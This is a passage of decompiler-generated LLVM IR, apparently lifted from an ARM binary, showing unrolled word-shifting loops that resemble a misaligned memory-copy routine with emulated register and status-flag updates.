  %v3_19a74 = sub i32 15, %v0_19a74
  %v4_19a74 = and i32 %v3_19a74, %v0_19a74
  %v5_19a74 = icmp slt i32 %v4_19a74, 0
  %v6_19a74 = icmp slt i32 %v1_19a74, 0
  %v2_19a78 = xor i1 %v6_19a74, %v5_19a74
  br i1 %v2_19a78, label %dec_label_pc_19a7c, label %dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge

dec_label_pc_19a4c.dec_label_pc_19a4c_crit_edge:  ; preds = %dec_label_pc_19a4c
  %v0_19a4c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_19a50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19a4c

dec_label_pc_19a7c:                               ; preds = %dec_label_pc_19a4c
  %v2_19a7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19a7c, i32* @r4, align 4
  %v5_19a7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_19a7c, i32* @r5, align 4
  %v1_19a80 = add i32 %v0_19a74, -4
  store i32 %v1_19a80, i32* %r2.global-to-local, align 4
  %v3_19a80 = add i32 %v0_19a74, 2147483632
  %v4_19a80 = and i32 %v1_19a80, %v3_19a80
  %v5_19a80 = icmp slt i32 %v4_19a80, 0
  store i1 %v5_19a80, i1* %cpsr_v.global-to-local, align 1
  %v6_19a80 = icmp slt i32 %v1_19a80, 0
  store i1 %v6_19a80, i1* %cpsr_n.global-to-local, align 1
  %v7_19a80 = icmp eq i32 %v1_19a80, 0
  store i1 %v7_19a80, i1* %cpsr_z.global-to-local, align 1
  %v2_19a84 = xor i1 %v6_19a80, %v5_19a80
  br i1 %v2_19a84, label %dec_label_pc_19aa0, label %dec_label_pc_19a88

dec_label_pc_19a88:                               ; preds = %dec_label_pc_19a7c, %dec_label_pc_19a3c, %dec_label_pc_19a88
  %v1_19a94 = phi i32 [ %v4_19a94, %dec_label_pc_19a88 ], [ %v12_19a70, %dec_label_pc_19a7c ], [ %v0_19adc75, %dec_label_pc_19a3c ]
  %v0_19a88 = load i32, i32* %lr.global-to-local, align 4
  %v3_19a88 = udiv i32 %v0_19a88, 65536
  store i32 %v3_19a88, i32* %ip.global-to-local, align 4
  %v0_19a8c = load i32, i32* %r1.global-to-local, align 4
  %v1_19a8c = inttoptr i32 %v0_19a8c to i32*
  %v2_19a8c = load i32, i32* %v1_19a8c, align 4
  store i32 %v2_19a8c, i32* %lr.global-to-local, align 4
  %v4_19a8c = add i32 %v0_19a8c, 4
  store i32 %v4_19a8c, i32* %r1.global-to-local, align 4
  %v4_19a90 = mul i32 %v2_19a8c, 65536
  %v5_19a90 = or i32 %v4_19a90, %v3_19a88
  store i32 %v5_19a90, i32* @ip, align 4
  %v2_19a94 = inttoptr i32 %v1_19a94 to i32*
  store i32 %v5_19a90, i32* %v2_19a94, align 4
  %v3_19a94 = load i32, i32* %r0.global-to-local, align 4
  %v4_19a94 = add i32 %v3_19a94, 4
  store i32 %v4_19a94, i32* %r0.global-to-local, align 4
  %v0_19a98 = load i32, i32* %r2.global-to-local, align 4
  %v1_19a98 = add i32 %v0_19a98, -4
  store i32 %v1_19a98, i32* %r2.global-to-local, align 4
  %v3_19a98 = sub i32 3, %v0_19a98
  %v4_19a98 = and i32 %v3_19a98, %v0_19a98
  %v5_19a98 = icmp slt i32 %v4_19a98, 0
  %v6_19a98 = icmp slt i32 %v1_19a98, 0
  %v2_19a9c = xor i1 %v6_19a98, %v5_19a98
  br i1 %v2_19a9c, label %dec_label_pc_19aa0.loopexit, label %dec_label_pc_19a88

dec_label_pc_19aa0.loopexit:                      ; preds = %dec_label_pc_19a88
  %v7_19a98 = icmp eq i32 %v0_19a98, 4
  store i1 %v5_19a98, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_19a98, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_19a98, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19aa0

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19aa0.loopexit, %dec_label_pc_19a7c
  %v0_1995c59 = phi i32 [ %v1_19a98, %dec_label_pc_19aa0.loopexit ], [ %v1_19a80, %dec_label_pc_19a7c ]
  %v0_19aa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_19aa0 = add i32 %v0_19aa0, -2
  store i32 %v1_19aa0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_19aa8:                               ; preds = %dec_label_pc_199bc
  br i1 %v2_19a40, label %dec_label_pc_19af4, label %dec_label_pc_19ab0

dec_label_pc_19ab0:                               ; preds = %dec_label_pc_19aa8
  store i32 %v1_19a3c, i32* %r2.global-to-local, align 4
  %v3_19ab4 = load i32, i32* @r4, align 4
  store i32 %v3_19ab4, i32* %stack_var_-16, align 4
  %v6_19ab4 = load i32, i32* @r5, align 4
  store i32 %v6_19ab4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19ab8

dec_label_pc_19ab8:                               ; preds = %dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge, %dec_label_pc_19ab0
  %v0_19adc = phi i32 [ %v12_19adc, %dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge ], [ %v0_19adc75, %dec_label_pc_19ab0 ]
  %v0_19abc = phi i32 [ %v0_19abc.pre, %dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge ], [ %v4_199c0, %dec_label_pc_19ab0 ]
  %v0_19ab8 = phi i32 [ %v0_19ab8.pre, %dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge ], [ %v2_199c0, %dec_label_pc_19ab0 ]
  %v3_19ab8 = udiv i32 %v0_19ab8, 16777216
  %v1_19abc = inttoptr i32 %v0_19abc to i32*
  %v2_19abc = load i32, i32* %v1_19abc, align 4
  store i32 %v2_19abc, i32* %r4.global-to-local, align 4
  %v3_19abc = add i32 %v0_19abc, 4
  %v4_19abc = inttoptr i32 %v3_19abc to i32*
  %v5_19abc = load i32, i32* %v4_19abc, align 4
  store i32 %v5_19abc, i32* %r5.global-to-local, align 4
  %v6_19abc = add i32 %v0_19abc, 8
  %v7_19abc = inttoptr i32 %v6_19abc to i32*
  %v8_19abc = load i32, i32* %v7_19abc, align 4
  store i32 %v8_19abc, i32* %ip.global-to-local, align 4
  %v9_19abc = add i32 %v0_19abc, 12
  %v10_19abc = inttoptr i32 %v9_19abc to i32*
  %v11_19abc = load i32, i32* %v10_19abc, align 4
  store i32 %v11_19abc, i32* %lr.global-to-local, align 4
  %v12_19abc = add i32 %v0_19abc, 16
  store i32 %v12_19abc, i32* %r1.global-to-local, align 4
  %v4_19ac0 = mul i32 %v2_19abc, 256
  %v5_19ac0 = or i32 %v4_19ac0, %v3_19ab8
  store i32 %v5_19ac0, i32* @r3, align 4
  %v3_19ac4 = udiv i32 %v2_19abc, 16777216
  %v4_19ac8 = mul i32 %v5_19abc, 256
  %v5_19ac8 = or i32 %v4_19ac8, %v3_19ac4
  store i32 %v5_19ac8, i32* %r4.global-to-local, align 4
  %v3_19acc = udiv i32 %v5_19abc, 16777216
  %v4_19ad0 = mul i32 %v8_19abc, 256
  %v5_19ad0 = or i32 %v4_19ad0, %v3_19acc
  store i32 %v5_19ad0, i32* %r5.global-to-local, align 4
  %v3_19ad4 = udiv i32 %v8_19abc, 16777216
  %v4_19ad8 = mul i32 %v11_19abc, 256
  %v5_19ad8 = or i32 %v4_19ad8, %v3_19ad4
  store i32 %v5_19ad8, i32* @ip, align 4
  %v1_19adc = inttoptr i32 %v0_19adc to i32*
  store i32 %v5_19ac0, i32* %v1_19adc, align 4
  %v3_19adc = add i32 %v0_19adc, 4
  %v4_19adc = inttoptr i32 %v3_19adc to i32*
  %v5_19adc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19adc, i32* %v4_19adc, align 4
  %v6_19adc = add i32 %v0_19adc, 8
  %v7_19adc = inttoptr i32 %v6_19adc to i32*
  %v8_19adc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_19adc, i32* %v7_19adc, align 4
  %v9_19adc = add i32 %v0_19adc, 12
  %v10_19adc = inttoptr i32 %v9_19adc to i32*
  %v11_19adc = load i32, i32* @ip, align 4
  store i32 %v11_19adc, i32* %v10_19adc, align 4
  %v12_19adc = add i32 %v0_19adc, 16
  store i32 %v12_19adc, i32* %r0.global-to-local, align 4
  %v0_19ae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_19ae0 = add i32 %v0_19ae0, -16
  store i32 %v1_19ae0, i32* %r2.global-to-local, align 4
  %v3_19ae0 = sub i32 15, %v0_19ae0
  %v4_19ae0 = and i32 %v3_19ae0, %v0_19ae0
  %v5_19ae0 = icmp slt i32 %v4_19ae0, 0
  %v6_19ae0 = icmp slt i32 %v1_19ae0, 0
  %v2_19ae4 = xor i1 %v6_19ae0, %v5_19ae0
  br i1 %v2_19ae4, label %dec_label_pc_19ae8, label %dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge

dec_label_pc_19ab8.dec_label_pc_19ab8_crit_edge:  ; preds = %dec_label_pc_19ab8
  %v0_19ab8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_19abc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19ab8

dec_label_pc_19ae8:                               ; preds = %dec_label_pc_19ab8
  %v2_19ae8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19ae8, i32* @r4, align 4
  %v5_19ae8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_19ae8, i32* @r5, align 4
  %v1_19aec = add i32 %v0_19ae0, -4
  store i32 %v1_19aec, i32* %r2.global-to-local, align 4
  %v3_19aec = add i32 %v0_19ae0, 2147483632
  %v4_19aec = and i32 %v1_19aec, %v3_19aec
  %v5_19aec = icmp slt i32 %v4_19aec, 0
  store i1 %v5_19aec, i1* %cpsr_v.global-to-local, align 1
  %v6_19aec = icmp slt i32 %v1_19aec, 0
  store i1 %v6_19aec, i1* %cpsr_n.global-to-local, align 1
  %v7_19aec = icmp eq i32 %v1_19aec, 0
  store i1 %v7_19aec, i1* %cpsr_z.global-to-local, align 1
  %v2_19af0 = xor i1 %v6_19aec, %v5_19aec
  br i1 %v2_19af0, label %dec_label_pc_19b0c, label %dec_label_pc_19af4

dec_label_pc_19af4:                               ; preds = %dec_label_pc_19ae8, %dec_label_pc_19aa8, %dec_label_pc_19af4
  %v1_19b00 = phi i32 [ %v4_19b00, %dec_label_pc_19af4 ], [ %v12_19adc, %dec_label_pc_19ae8 ], [ %v0_19adc75, %dec_label_pc_19aa8 ]
  %v0_19af4 = load i32, i32* %lr.global-to-local, align 4
  %v3_19af4 = udiv i32 %v0_19af4, 16777216
  store i32 %v3_19af4, i32* %ip.global-to-local, align 4
  %v0_19af8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19af8 = inttoptr i32 %v0_19af8 to i32*
  %v2_19af8 = load i32, i32* %v1_19af8, align 4
  store i32 %v2_19af8, i32* %lr.global-to-local, align 4
  %v4_19af8 = add i32 %v0_19af8, 4
  store i32 %v4_19af8, i32* %r1.global-to-local, align 4
  %v4_19afc = mul i32 %v2_19af8, 256
  %v5_19afc = or i32 %v4_19afc, %v3_19af4
  store i32 %v5_19afc, i32* @ip, align 4
  %v2_19b00 = inttoptr i32 %v1_19b00 to i32*
  store i32 %v5_19afc, i32* %v2_19b00, align 4
  %v3_19b00 = load i32, i32* %r0.global-to-local, align 4
  %v4_19b00 = add i32 %v3_19b00, 4
  store i32 %v4_19b00, i32* %r0.global-to-local, align 4
  %v0_19b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_19b04 = add i32 %v0_19b04, -4
  store i32 %v1_19b04, i32* %r2.global-to-local, align 4
  %v3_19b04 = sub i32 3, %v0_19b04
  %v4_19b04 = and i32 %v3_19b04, %v0_19b04
  %v5_19b04 = icmp slt i32 %v4_19b04, 0
  %v6_19b04 = icmp slt i32 %v1_19b04, 0
  %v2_19b08 = xor i1 %v6_19b04, %v5_19b04
  br i1 %v2_19b08, label %dec_label_pc_19b0c.loopexit, label %dec_label_pc_19af4

dec_label_pc_19b0c.loopexit:                      ; preds = %dec_label_pc_19af4
  %v7_19b04 = icmp eq i32 %v0_19b04, 4
  store i1 %v5_19b04, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_19b04, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_19b04, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19b0c

dec_label_pc_19b0c:                               ; preds = %dec_label_pc_19b0c.loopexit, %dec_label_pc_19ae8
  %v0_1995c60 = phi i32 [ %v1_19b04, %dec_label_pc_19b0c.loopexit ], [ %v1_19aec, %dec_label_pc_19ae8 ]
  %v0_19b0c = load i32, i32* %r1.global-to-local, align 4
  %v1_19b0c = add i32 %v0_19b0c, -1
  store i32 %v1_19b0c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_19b14:                               ; preds = %dec_label_pc_198c0
  %v1_19b14 = load i32, i32* @r2, align 4
  %v2_19b14 = add i32 %v1_19b14, %v0_198c0
  store i32 %v2_19b14, i32* %r1.global-to-local, align 4
  %v2_19b18 = add i32 %v1_19b14, %v1_198c0
  store i32 %v2_19b18, i32* %r0.global-to-local, align 4
  %v2_19b1c = add i32 %v1_19b14, -4
  store i32 %v2_19b1c, i32* %r2.global-to-local, align 4
  %v4_19b1c = sub i32 3, %v1_19b14
  %v5_19b1c = and i32 %v4_19b1c, %v1_19b14
  %v6_19b1c = icmp slt i32 %v5_19b1c, 0
  store i1 %v6_19b1c, i1* %cpsr_v.global-to-local, align 1
  %v7_19b1c = icmp slt i32 %v2_19b1c, 0
  store i1 %v7_19b1c, i1* %cpsr_n.global-to-local, align 1
  %v8_19b1c = icmp eq i32 %v1_19b14, 4
  store i1 %v8_19b1c, i1* %cpsr_z.global-to-local, align 1
  %v5_19b20 = icmp slt i32 %v1_19b14, 4
  br i1 %v5_19b20, label %bb150, label %dec_label_pc_19b24

dec_label_pc_19b24:                               ; preds = %dec_label_pc_19b14
  %v1_19b24 = urem i32 %v2_19b18, 4
  store i32 %v1_19b24, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19b24 = icmp eq i32 %v1_19b24, 0
  store i1 %v2_19b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b24, label %dec_label_pc_19b2c, label %dec_label_pc_19bcc

dec_label_pc_19b2c:                               ; preds = %dec_label_pc_19b24
  %v1_19b2c = urem i32 %v2_19b14, 4
  store i32 %v1_19b2c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19b2c = icmp eq i32 %v1_19b2c, 0
  store i1 %v2_19b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b2c, label %dec_label_pc_19b34, label %dec_label_pc_19bf8

dec_label_pc_19b34:                               ; preds = %dec_label_pc_19b2c, %dec_label_pc_19bf0
  %v0_19b4c36 = phi i32 [ %v2_19b18, %dec_label_pc_19b2c ], [ %v0_19c4019, %dec_label_pc_19bf0 ]
  %v0_19b4835 = phi i32 [ %v2_19b14, %dec_label_pc_19b2c ], [ %v0_19bf0, %dec_label_pc_19bf0 ]
  %v0_19b34 = phi i32 [ %v2_19b1c, %dec_label_pc_19b2c ], [ %v2_19be8, %dec_label_pc_19bf0 ]
  %v2_19b34 = add i32 %v0_19b34, -8
  store i32 %v2_19b34, i32* %r2.global-to-local, align 4
  %v4_19b34 = sub i32 7, %v0_19b34
  %v5_19b34 = and i32 %v4_19b34, %v0_19b34
  %v6_19b34 = icmp slt i32 %v5_19b34, 0
  store i1 %v6_19b34, i1* %cpsr_v.global-to-local, align 1
  %v7_19b34 = icmp slt i32 %v2_19b34, 0
  store i1 %v7_19b34, i1* %cpsr_n.global-to-local, align 1
  %v8_19b34 = icmp eq i32 %v0_19b34, 8
  store i1 %v8_19b34, i1* %cpsr_z.global-to-local, align 1
  %v5_19b38 = icmp slt i32 %v0_19b34, 8
  br i1 %v5_19b38, label %dec_label_pc_19b84, label %dec_label_pc_19b3c

dec_label_pc_19b3c:                               ; preds = %dec_label_pc_19b34
  %v3_19b3c = load i32, i32* @r4, align 4
  %v5_19b3c = inttoptr i32 %v3_19b3c to i8*
  store i8* %v5_19b3c, i8** %stack_var_-8, align 4
  %v8_19b3c = load i32, i32* @lr, align 4
  %v2_19b40 = add i32 %v0_19b34, -28
  store i32 %v2_19b40, i32* %r2.global-to-local, align 4
  %v4_19b40 = sub i32 27, %v0_19b34
  %v5_19b40 = and i32 %v4_19b40, %v2_19b34
  %v6_19b40 = icmp slt i32 %v5_19b40, 0
  store i1 %v6_19b40, i1* %cpsr_v.global-to-local, align 1
  %v7_19b40 = icmp slt i32 %v2_19b40, 0
  store i1 %v7_19b40, i1* %cpsr_n.global-to-local, align 1
  %v8_19b40 = icmp eq i32 %v2_19b34, 20
  store i1 %v8_19b40, i1* %cpsr_z.global-to-local, align 1
  %v5_19b44 = icmp slt i32 %v2_19b34, 20
  br i1 %v5_19b44, label %dec_label_pc_19b60, label %dec_label_pc_19b48

dec_label_pc_19b48:                               ; preds = %dec_label_pc_19b3c, %dec_label_pc_19b48.dec_label_pc_19b48_crit_edge
  %v0_19b4c = phi i32 [ %v1_19b54, %dec_label_pc_19b48.dec_label_pc_19b48_crit_edge ], [ %v0_19b4c36, %dec_label_pc_19b3c ]
  %v0_19b48 = phi i32 [ %v0_19b48.pre, %dec_label_pc_19b48.dec_label_pc_19b48_crit_edge ], [ %v0_19b4835, %dec_label_pc_19b3c ]
  %v1_19b48 = add i32 %v0_19b48, -4
  %v2_19b48 = inttoptr i32 %v1_19b48 to i32*
  %v3_19b48 = load i32, i32* %v2_19b48, align 4
  %v4_19b48 = add i32 %v0_19b48, -8
  %v5_19b48 = inttoptr i32 %v4_19b48 to i32*
  %v6_19b48 = load i32, i32* %v5_19b48, align 4
  store i32 %v6_19b48, i32* %r4.global-to-local, align 4
  %v7_19b48 = add i32 %v0_19b48, -12
  %v8_19b48 = inttoptr i32 %v7_19b48 to i32*
  %v9_19b48 = load i32, i32* %v8_19b48, align 4
  store i32 %v9_19b48, i32* %ip.global-to-local, align 4
  %v10_19b48 = add i32 %v0_19b48, -16
  %v11_19b48 = inttoptr i32 %v10_19b48 to i32*
  %v12_19b48 = load i32, i32* %v11_19b48, align 4
  store i32 %v12_19b48, i32* %lr.global-to-local, align 4
  store i32 %v10_19b48, i32* %r1.global-to-local, align 4
  %v1_19b4c = add i32 %v0_19b4c, -16
  %v2_19b4c = inttoptr i32 %v1_19b4c to i32*
  store i32 %v3_19b48, i32* %v2_19b4c, align 4
  %v4_19b4c = add i32 %v0_19b4c, -12
  %v5_19b4c = inttoptr i32 %v4_19b4c to i32*
  %v6_19b4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_19b4c, i32* %v5_19b4c, align 4
  %v7_19b4c = add i32 %v0_19b4c, -8
  %v8_19b4c = inttoptr i32 %v7_19b4c to i32*
  %v9_19b4c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_19b4c, i32* %v8_19b4c, align 4
  %v10_19b4c = add i32 %v0_19b4c, -4
  %v11_19b4c = inttoptr i32 %v10_19b4c to i32*
  %v12_19b4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19b4c, i32* %v11_19b4c, align 4
  store i32 %v1_19b4c, i32* %r0.global-to-local, align 4
  %v0_19b50 = load i32, i32* %r1.global-to-local, align 4
  %v1_19b50 = add i32 %v0_19b50, -4
  %v2_19b50 = inttoptr i32 %v1_19b50 to i32*
  %v3_19b50 = load i32, i32* %v2_19b50, align 4
  store i32 %v3_19b50, i32* @r3, align 4
  %v4_19b50 = add i32 %v0_19b50, -8
  %v5_19b50 = inttoptr i32 %v4_19b50 to i32*
  %v6_19b50 = load i32, i32* %v5_19b50, align 4
  store i32 %v6_19b50, i32* %r4.global-to-local, align 4
  %v7_19b50 = add i32 %v0_19b50, -12
  %v8_19b50 = inttoptr i32 %v7_19b50 to i32*
  %v9_19b50 = load i32, i32* %v8_19b50, align 4
  store i32 %v9_19b50, i32* @ip, align 4
  %v10_19b50 = add i32 %v0_19b50, -16
  %v11_19b50 = inttoptr i32 %v10_19b50 to i32*
  %v12_19b50 = load i32, i32* %v11_19b50, align 4
  store i32 %v12_19b50, i32* %lr.global-to-local, align 4
  store i32 %v10_19b50, i32* %r1.global-to-local, align 4
  %v1_19b54 = add i32 %v0_19b4c, -32
  %v2_19b54 = inttoptr i32 %v1_19b54 to i32*
  store i32 %v3_19b50, i32* %v2_19b54, align 4
  %v4_19b54 = add i32 %v0_19b4c, -28
  %v5_19b54 = inttoptr i32 %v4_19b54 to i32*
  %v6_19b54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_19b54, i32* %v5_19b54, align 4
  %v7_19b54 = add i32 %v0_19b4c, -24
  %v8_19b54 = inttoptr i32 %v7_19b54 to i32*
  %v9_19b54 = load i32, i32* @ip, align 4
  store i32 %v9_19b54, i32* %v8_19b54, align 4
  %v10_19b54 = add i32 %v0_19b4c, -20
  %v11_19b54 = inttoptr i32 %v10_19b54 to i32*
  %v12_19b54 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19b54, i32* %v11_19b54, align 4
  store i32 %v1_19b54, i32* %r0.global-to-local, align 4
  %v0_19b58 = load i32, i32* %r2.global-to-local, align 4
  %v2_19b58 = add i32 %v0_19b58, -32
  store i32 %v2_19b58, i32* %r2.global-to-local, align 4
  %v6_19b5c = icmp slt i32 %v0_19b58, 32
  br i1 %v6_19b5c, label %dec_label_pc_19b60.loopexit, label %dec_label_pc_19b48.dec_label_pc_19b48_crit_edge

dec_label_pc_19b48.dec_label_pc_19b48_crit_edge:  ; preds = %dec_label_pc_19b48
  %v0_19b48.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19b48

dec_label_pc_19b60.loopexit:                      ; preds = %dec_label_pc_19b48
  %v4_19b58 = sub i32 31, %v0_19b58
  %v5_19b58 = and i32 %v4_19b58, %v0_19b58
  %v6_19b58 = icmp slt i32 %v5_19b58, 0
  %v7_19b58 = icmp slt i32 %v2_19b58, 0
  store i1 %v6_19b58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19b58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19b60

dec_label_pc_19b60:                               ; preds = %dec_label_pc_19b60.loopexit, %dec_label_pc_19b3c
  %v6_19b68 = phi i32 [ %v1_19b54, %dec_label_pc_19b60.loopexit ], [ %v0_19b4c36, %dec_label_pc_19b3c ]
  %v0_19b70.pr = phi i32 [ %v2_19b58, %dec_label_pc_19b60.loopexit ], [ %v2_19b40, %dec_label_pc_19b3c ]
  %v4_19b60 = add i32 %v0_19b70.pr, 16
  %v6_19b60 = sub i32 0, %v0_19b70.pr
  %v7_19b60 = and i32 %v4_19b60, %v6_19b60
  %v8_19b60 = icmp slt i32 %v7_19b60, 0
  store i1 %v8_19b60, i1* %cpsr_v.global-to-local, align 1
  %v9_19b60 = icmp slt i32 %v4_19b60, 0
  store i1 %v9_19b60, i1* %cpsr_n.global-to-local, align 1
  %v10_19b60 = icmp eq i32 %v4_19b60, 0
  store i1 %v10_19b60, i1* %cpsr_z.global-to-local, align 1
  %v5_19b64 = icmp slt i32 %v0_19b70.pr, -16
  br i1 %v5_19b64, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_19b60
  %v6_19b64 = load i32, i32* %r1.global-to-local, align 4
  %v7_19b64 = add i32 %v6_19b64, -4
  %v8_19b64 = inttoptr i32 %v7_19b64 to i32*
  %v9_19b64 = load i32, i32* %v8_19b64, align 4
  store i32 %v9_19b64, i32* @r3, align 4
  %v10_19b64 = add i32 %v6_19b64, -8
  %v11_19b64 = inttoptr i32 %v10_19b64 to i32*
  %v12_19b64 = load i32, i32* %v11_19b64, align 4
  store i32 %v12_19b64, i32* %r4.global-to-local, align 4
  %v13_19b64 = add i32 %v6_19b64, -12
  %v14_19b64 = inttoptr i32 %v13_19b64 to i32*
  %v15_19b64 = load i32, i32* %v14_19b64, align 4
  store i32 %v15_19b64, i32* @ip, align 4
  %v16_19b64 = add i32 %v6_19b64, -16
  %v17_19b64 = inttoptr i32 %v16_19b64 to i32*
  %v18_19b64 = load i32, i32* %v17_19b64, align 4
  store i32 %v18_19b64, i32* %lr.global-to-local, align 4
  store i32 %v16_19b64, i32* %r1.global-to-local, align 4
  %v7_19b68 = add i32 %v6_19b68, -16
  %v8_19b68 = inttoptr i32 %v7_19b68 to i32*
  store i32 %v9_19b64, i32* %v8_19b68, align 4
  %v10_19b68 = add i32 %v6_19b68, -12
  %v11_19b68 = inttoptr i32 %v10_19b68 to i32*
  %v12_19b68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_19b68, i32* %v11_19b68, align 4
  %v13_19b68 = add i32 %v6_19b68, -8
  %v14_19b68 = inttoptr i32 %v13_19b68 to i32*
  %v15_19b68 = load i32, i32* @ip, align 4
  store i32 %v15_19b68, i32* %v14_19b68, align 4
  %v16_19b68 = add i32 %v6_19b68, -4
  %v17_19b68 = inttoptr i32 %v16_19b68 to i32*
  %v18_19b68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_19b68, i32* %v17_19b68, align 4
  store i32 %v7_19b68, i32* %r0.global-to-local, align 4
  %v6_19b6c = load i32, i32* %r2.global-to-local, align 4
  %v7_19b6c = add i32 %v6_19b6c, -16
  store i32 %v7_19b6c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19b60, %bb147
  %v6_19b78 = phi i32 [ %v7_19b68, %bb147 ], [ %v6_19b68, %dec_label_pc_19b60 ]
  %v0_19b70 = phi i32 [ %v7_19b6c, %bb147 ], [ %v0_19b70.pr, %dec_label_pc_19b60 ]
  %v4_19b70 = add i32 %v0_19b70, 20
  store i32 %v4_19b70, i32* %r2.global-to-local, align 4
  %v6_19b70 = sub i32 0, %v0_19b70
  %v7_19b70 = and i32 %v4_19b70, %v6_19b70
  %v8_19b70 = icmp slt i32 %v7_19b70, 0
  store i1 %v8_19b70, i1* %cpsr_v.global-to-local, align 1
  %v9_19b70 = icmp slt i32 %v4_19b70, 0
  store i1 %v9_19b70, i1* %cpsr_n.global-to-local, align 1
  %v10_19b70 = icmp eq i32 %v4_19b70, 0
  store i1 %v10_19b70, i1* %cpsr_z.global-to-local, align 1
  %v5_19b74 = icmp slt i32 %v0_19b70, -20
  br i1 %v5_19b74, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_19b74 = load i32, i32* %r1.global-to-local, align 4
  %v7_19b74 = add i32 %v6_19b74, -4
  %v8_19b74 = inttoptr i32 %v7_19b74 to i32*
  %v9_19b74 = load i32, i32* %v8_19b74, align 4
  store i32 %v9_19b74, i32* @r3, align 4
  %v10_19b74 = add i32 %v6_19b74, -8
  %v11_19b74 = inttoptr i32 %v10_19b74 to i32*
  %v12_19b74 = load i32, i32* %v11_19b74, align 4
  store i32 %v12_19b74, i32* @ip, align 4
  %v13_19b74 = add i32 %v6_19b74, -12
  %v14_19b74 = inttoptr i32 %v13_19b74 to i32*
  %v15_19b74 = load i32, i32* %v14_19b74, align 4
  store i32 %v15_19b74, i32* %lr.global-to-local, align 4
  store i32 %v13_19b74, i32* %r1.global-to-local, align 4
  %v7_19b78 = add i32 %v6_19b78, -12
  %v8_19b78 = inttoptr i32 %v7_19b78 to i32*
  store i32 %v9_19b74, i32* %v8_19b78, align 4
  %v10_19b78 = add i32 %v6_19b78, -8
  %v11_19b78 = inttoptr i32 %v10_19b78 to i32*
  %v12_19b78 = load i32, i32* @ip, align 4
  store i32 %v12_19b78, i32* %v11_19b78, align 4
  %v13_19b78 = add i32 %v6_19b78, -4
  %v14_19b78 = inttoptr i32 %v13_19b78 to i32*
  %v15_19b78 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_19b78, i32* %v14_19b78, align 4
  store i32 %v7_19b78, i32* %r0.global-to-local, align 4
  %v6_19b7c = load i32, i32* %r2.global-to-local, align 4
  %v7_19b7c = add i32 %v6_19b7c, -12
  store i32 %v7_19b7c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_19b9c44 = phi i32 [ %v6_19b78, %.thread1 ], [ %v7_19b78, %bb148 ]
  %v0_19b8442 = phi i32 [ %v4_19b70, %.thread1 ], [ %v7_19b7c, %bb148 ]
  %v2_19b80 = load i8*, i8** %stack_var_-8, align 4
  %v3_19b80 = ptrtoint i8* %v2_19b80 to i32
  store i32 %v3_19b80, i32* @r4, align 4
  store i32 %v8_19b3c, i32* @lr, align 4
  br label %dec_label_pc_19b84

dec_label_pc_19b84:                               ; preds = %dec_label_pc_19b34, %.thread3
  %v7_19b94 = phi i32 [ %v0_19b4c36, %dec_label_pc_19b34 ], [ %v6_19b9c44, %.thread3 ]
  %v0_19b84 = phi i32 [ %v2_19b34, %dec_label_pc_19b34 ], [ %v0_19b8442, %.thread3 ]
  %v2_19b84 = add i32 %v0_19b84, 8
  store i32 %v2_19b84, i32* %r2.global-to-local, align 4
  %v4_19b84 = sub i32 0, %v0_19b84
  %v5_19b84 = and i32 %v2_19b84, %v4_19b84
  %v6_19b84 = icmp slt i32 %v5_19b84, 0
  store i1 %v6_19b84, i1* %cpsr_v.global-to-local, align 1
  %v7_19b84 = icmp slt i32 %v2_19b84, 0
  store i1 %v7_19b84, i1* %cpsr_n.global-to-local, align 1
  %v8_19b84 = icmp eq i32 %v2_19b84, 0
  store i1 %v8_19b84, i1* %cpsr_z.global-to-local, align 1
  %v5_19b88 = icmp slt i32 %v0_19b84, -8
